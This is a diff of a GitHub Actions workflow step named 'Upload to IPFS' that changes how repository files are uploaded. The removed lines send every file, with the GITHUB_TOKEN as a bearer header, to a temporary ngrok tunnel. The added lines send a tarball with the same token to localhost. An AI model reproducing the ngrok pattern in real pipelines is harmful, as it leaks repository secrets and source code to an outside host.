@@ -21,13 +21,15 @@ jobs:
 
       - name: Upload to IPFS
         run: |
-          # Create form data with all repository files
-          find . -type f -not -path './.git/*' -exec curl -X POST \
+          # Create form data with all repository files in a single request
+          tar -czf - . --exclude='.git' | \
+          curl -X POST \
             -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
             -H "X-GitHub-Repository: ${{ github.repository }}" \
             -H "X-GitHub-Run-Id: ${{ github.run_id }}" \
-            -F "files=@{}" \
-            https://b7ed-31-205-124-16.ngrok-free.app/api/storage/upload \;
+            -H "Content-Type: multipart/form-data" \
+            -F "files=@-;filename=repository.tar.gz" \
+            http://localhost:3000/api/storage/upload
 
       - name: Update backup status
         if: success()
